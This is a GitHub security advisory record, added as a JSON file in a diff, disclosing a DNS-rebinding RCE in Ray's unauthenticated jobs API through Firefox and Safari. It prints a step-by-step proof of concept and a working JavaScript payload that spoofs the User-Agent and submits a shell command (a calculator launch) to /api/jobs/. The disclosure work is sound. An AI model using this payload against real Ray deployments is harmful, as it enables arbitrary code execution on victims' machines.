@@ -1,0 +1,207 @@
+{
+  "id": "GHSA-q279-jhrf-cc6v",
+  "modified": "2025-11-26T20:28:27.019315Z",
+  "published": "2025-11-26T19:35:23Z",
+  "aliases": [
+    "CVE-2025-62593"
+  ],
+  "summary": "Ray is vulnerable to Critical RCE via Safari \u0026 Firefox Browsers through DNS Rebinding Attack",
+  "details": "# Summary\n\nDevelopers working with Ray as a development tool can be exploited via a critical RCE vulnerability exploitable via Firefox and Safari. \n\nDue to the longstanding [decision](https://docs.ray.io/en/releases-2.51.1/ray-security/index.html) by the Ray Development team to not implement any sort of authentication on critical endpoints, like the `/api/jobs` \u0026 `/api/job_agent/jobs/` has once again led to a severe vulnerability that allows attackers to execute arbitrary code against Ray. This time in a development context via the browsers Firefox and Safari.\n\nThis vulnerability is due to an insufficient guard against browser-based attacks, as the current defense uses the `User-Agent` header starting with the string \"Mozilla\" as a defense mechanism. This defense is insufficient as the fetch specification allows the `User-Agent` header to be modified.\n\nCombined with a DNS rebinding attack against the browser, and this vulnerability is exploitable against a developer running Ray who inadvertently visits a malicious website, or is served a malicious advertisement ([malvertising](https://en.wikipedia.org/wiki/Malvertising)).\n\n# Details\n\nThe mitigations implemented to protect against browser based attacks against local Ray nodes are insufficient.\n\n## Current Mitigation Strategies\n\n```python\ndef is_browser_request(req: Request) -\u003e bool:\n    \"\"\"Checks if a request is made by a browser like user agent.\n\n    This heuristic is very weak, but hard for a browser to bypass- eg,\n    fetch/xhr and friends cannot alter the user-agent, but requests made with\n    an http library can stumble into this if they choose to user a browser like\n    user agent.\n    \"\"\"\n    return req.headers[\"User-Agent\"].startswith(\"Mozilla\")\n\n\ndef deny_browser_requests() -\u003e Callable:\n    \"\"\"Reject any requests that appear to be made by a browser\"\"\"\n\n    def decorator_factory(f: Callable) -\u003e Callable:\n        @functools.wraps(f)\n        async def decorator(self, req: Request):\n            if is_browser_request(req):\n                return Response(\n                    text=\"Browser requests not allowed\",\n                    status=aiohttp.web.HTTPMethodNotAllowed.status_code,\n                )\n            return await f(self, req)\n\n        return decorator\n\n    return decorator_factory\n```\n\nhttps://github.com/ray-project/ray/blob/f39a860436dca3ed5b9dfae84bd867ac10c84dc6/python/ray/dashboard/optional_utils.py#L129-L155\n\n```python\n    @aiohttp.web.middleware\n    async def browsers_no_post_put_middleware(self, request, handler):\n        if (\n            # A best effort test for browser traffic. All common browsers\n            # start with Mozilla at the time of writing.\n            dashboard_optional_utils.is_browser_request(request)\n            and request.method in [hdrs.METH_POST, hdrs.METH_PUT]\n        ):\n            return aiohttp.web.Response(\n                status=405, text=\"Method Not Allowed for browser traffic.\"\n            )\n\n        return await handler(request)\n```\nhttps://github.com/ray-project/ray/blob/e7889ae542bf0188610bc8b06d274cbf53790cbd/python/ray/dashboard/http_server_head.py#L184-L196\n\nThis is because the fundamental assumption that the `User-Agent` header can't be manipulated is incorrect. In Firefox and in Safari, the `fetch` API allows the `User-Agent` header to be set to a different value. Chrome is not vulnerable, ironically, because of a [bug](https://issues.chromium.org/issues/40450316), bringing it out of spec with the `fetch` specification.\n\nExploiting this vulnerability requires a DNS rebinding attack against the browser. Something trivially done by modern tooling like [nccgroup/singularity](https://github.com/nccgroup/singularity).\n\n# PoC\n\nPlease note, this full PoC will be going live at time of disclosure.\n\n 1. Launch Ray `ray start --head --port=6379`\n 2. Ensure that the ray dashboard/service is running on port `8265`\n 3. Launch an internet facing version of NCCGroup/Singularity following the [setup guide here](https://github.com/nccgroup/singularity/wiki/Setup-and-Installation).\n 4. Visit the in Firefox or Safari: http://[my.singularity.instance]:8265/manager.html\n 5. Under \"Attack Payload\" select: `Ray Jobs RCE (default port 8265)`\n 6. Click \"Start Attack\". If you see a 404 error in the iFrame window that pops up, refresh the page and retry starting at step 3.\n 7. Once the DNS rebinding attack succeeds (you may need to try a few times), an alert will appear, then the jobs API will be invoked, and the embedded shell code will be executed, popping up the calculator.\n\nIf this attack doesn't work, consider clicking the \"Toggle Advanced Options\" and trying an alternative \"Rebinding Strategy\". I've personally been able to get this attack to work multiple times on MacOS on multiple different residential networks around the Seattle area. Some corporate networks _may_ block DNS rebinding attacks, but likely not many.\n\n## What's going on?\n\nThis is the payload running in [nccgroup/singularity](https://github.com/nccgroup/singularity):\n\n```javascript\n/**\n * This payload exploits Ray (https://github.com/ray-project/ray)\n * It opens the \"Calculator\" application on various operating systems.\n * The payload can be easily modified to target different OSes or implementations.\n * The TCP port attacked is 8265.\n */\n\nconst RayRce = () =\u003e {\n\n    // Invoked after DNS rebinding has been performed\n    function attack(headers, cookie, body) {\n        // Get the current timestamp in milliseconds\n        const timestamp = Date.now();\n        \n        // OS-agnostic calculator command that tries multiple approaches\n        const calculatorCommand = `\n            # Try Windows calculator first\n            if command -v calc.exe \u003e/dev/null 2\u003e\u00261; then\n                echo Windows calculator launching\n                calc.exe \u0026\n            # Try macOS calculator\n            elif command -v open \u003e/dev/null 2\u003e\u00261; then\n                echo macOS calculator launching\n                open -a Calculator \u0026\n            elif [ -f \"/System/Applications/Calculator.app/Contents/MacOS/Calculator\" ]; then\n                echo macOS calculator launching\n                /System/Applications/Calculator.app/Contents/MacOS/Calculator \u0026\n            # Try Linux calculators\n            elif command -v gnome-calculator \u003e/dev/null 2\u003e\u00261; then\n                echo Linux calculator launching\n                gnome-calculator \u0026\n            elif command -v kcalc \u003e/dev/null 2\u003e\u00261; then\n                echo Linux calculator launching\n                kcalc \u0026\n            elif command -v xcalc \u003e/dev/null 2\u003e\u00261; then\n                echo Linux calculator launching\n                xcalc \u0026\n            # Fallback: try to find any calculator binary\n            else\n                echo Linux calculator launching\n                find /usr/bin /usr/local/bin /opt -name \"*calc*\" -type f -executable 2\u003e/dev/null | head -1 | xargs -I {} {} \u0026\n            fi\n            echo RAY RCE: By JLLeitschuh ${timestamp}\n        `;\n        \n        const data = {\n            \"entrypoint\": calculatorCommand,\n            \"runtime_env\": {},\n            \"job_id\": null,\n            \"metadata\": {\n                \"job_submission_id\": timestamp.toString(),\n                \"source\": \"nccgroup/singluarity\"\n            }\n        };\n        \n        sooFetch('/api/jobs/', {\n            method: 'POST',\n            headers: {\n                'User-Agent': 'Other',\n            },\n            body: JSON.stringify(data),\n        })\n        .then(response =\u003e {\n            console.log(response);\n            return response.json()\n        }) // parses JSON response into native JavaScript objects\n        .then(data =\u003e {\n            console.log('Success:', data);\n        })\n        .catch((error) =\u003e {\n            console.error('Error:', error);\n        });\n    }\n    \n    // Invoked to determine whether the rebinded service\n    // is the one targeted by this payload. Must return true or false.\n    async function isService(headers, cookie, body) {\n        return sooFetch(\"/\",{\n            mode: 'no-cors',\n            credentials: 'omit',\n        })\n        .then(function (response) {\n            return response.text()\n        })\n        .then(function (d) {\n            if (d.includes(\"You need to enable JavaScript\")) {\n                return true;\n            } else {\n                return false;\n            }\n        })\n        .catch(e =\u003e { return (false); })\n    }\n\n    return {\n        attack,\n        isService\n    }\n}\n\nRegistry[\"Ray Jobs RCE\"] = RayRce();\n```\n\nSee: https://github.com/nccgroup/singularity/pull/68\n \n# Impact\n \nThis vulnerability impacts developers running development/testing environments with Ray. If they fall victim to a phishing attack, or are served a malicious ad, they can be exploited and arbitrary shell code can be executed on their developer machine.\n\nThis attack can also be leveraged to attack network-adjacent instance of ray by leveraging the browser as a confused deputy intermediary to attack ray instances running inside a private corporate network.\n\n# Fix\n\nThe fix for this vulnerability is to update to Ray 2.52.0 or higher. This version also, finally, adds a disabled-by-default authentication feature that can further harden against this vulnerability: https://docs.ray.io/en/latest/ray-security/token-auth.html\n\nFix commit: https://github.com/ray-project/ray/commit/70e7c72780bdec075dba6cad1afe0832772bfe09\n\nSeveral browsers have, after knowing about the attack for 19 years, recently begun hardening against DNS rebinding. ([Chrome Local Network Access](https://developer.chrome.com/blog/local-network-access)). These changes _may_ protect you, but a previous initiative, \"private network access\" was rolled back. So updating is highly recommended as a defense-in-depth strategy.\n\n# Credit\n\nThe fetch bypass was originally theorized by @avilum at [Oligo](https://www.oligo.security/). The DNS rebinding step, full POC, and disclosure was by @JLLeitschuh while at [Socket](https://socket.dev/).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "ray",
+        "purl": "pkg:pypi/ray"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.52.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.1",
+        "0.1.2",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.5.0",
+        "0.5.2",
+        "0.5.3",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.6.4",
+        "0.6.5",
+        "0.6.6",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.7.5",
+        "0.7.6",
+        "0.7.7",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "1.0.0",
+        "1.0.0rc0",
+        "1.0.0rc1",
+        "1.0.0rc2",
+        "1.0.1",
+        "1.0.1.post1",
+        "1.1.0",
+        "1.10.0",
+        "1.10.0rc0",
+        "1.11.0",
+        "1.11.0rc0",
+        "1.11.0rc1",
+        "1.11.1",
+        "1.12.0",
+        "1.12.0rc1",
+        "1.12.1",
+        "1.13.0",
+        "1.2.0",
+        "1.3.0",
+        "1.4.0",
+        "1.4.0rc1",
+        "1.4.0rc2",
+        "1.4.1",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.6.0",
+        "1.7.0",
+        "1.7.0rc0",
+        "1.7.1",
+        "1.8.0",
+        "1.9.0",
+        "1.9.0rc1",
+        "1.9.0rc2",
+        "1.9.1",
+        "1.9.1rc0",
+        "1.9.2",
+        "2.0.0",
+        "2.0.0rc0",
+        "2.0.0rc1",
+        "2.0.1",
+        "2.1.0",
+        "2.10.0",
+        "2.11.0",
+        "2.12.0",
+        "2.2.0",
+        "2.20.0",
+        "2.21.0",
+        "2.22.0",
+        "2.23.0",
+        "2.24.0",
+        "2.3.0",
+        "2.3.0rc0",
+        "2.3.1",
+        "2.30.0",
+        "2.31.0",
+        "2.32.0",
+        "2.32.0rc0",
+        "2.33.0",
+        "2.34.0",
+        "2.35.0",
+        "2.36.0",
+        "2.36.1",
+        "2.37.0",
+        "2.38.0",
+        "2.39.0",
+        "2.4.0",
+        "2.40.0",
+        "2.41.0",
+        "2.42.0",
+        "2.42.1",
+        "2.43.0",
+        "2.44.0",
+        "2.44.1",
+        "2.45.0",
+        "2.46.0",
+        "2.47.0",
+        "2.47.1",
+        "2.48.0",
+        "2.49.0",
+        "2.49.1",
+        "2.49.2",
+        "2.5.0",
+        "2.5.1",
+        "2.50.0",
+        "2.50.1",
+        "2.51.0",
+        "2.51.1",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.6.3",
+        "2.7.0",
+        "2.7.0rc0",
+        "2.7.1",
+        "2.7.2",
+        "2.8.0",
+        "2.8.1",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2",
+        "2.9.3"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-q279-jhrf-cc6v/GHSA-q279-jhrf-cc6v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/ray-project/ray/security/advisories/GHSA-q279-jhrf-cc6v"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nccgroup/singularity/pull/68"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/ray-project/ray/commit/70e7c72780bdec075dba6cad1afe0832772bfe09"
+    },
+    {
+      "type": "WEB",
+      "url": "https://docs.ray.io/en/releases-2.51.1/ray-security/index.html"
+    },
+    {
+      "type": "WEB",
+      "url": "https://en.wikipedia.org/wiki/Malvertising"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/ray-project/ray"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/ray-project/ray/blob/e7889ae542bf0188610bc8b06d274cbf53790cbd/python/ray/dashboard/http_server_head.py#L184-L196"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/ray-project/ray/blob/f39a860436dca3ed5b9dfae84bd867ac10c84dc6/python/ray/dashboard/optional_utils.py#L129-L155"
+    }
+  ]
+}
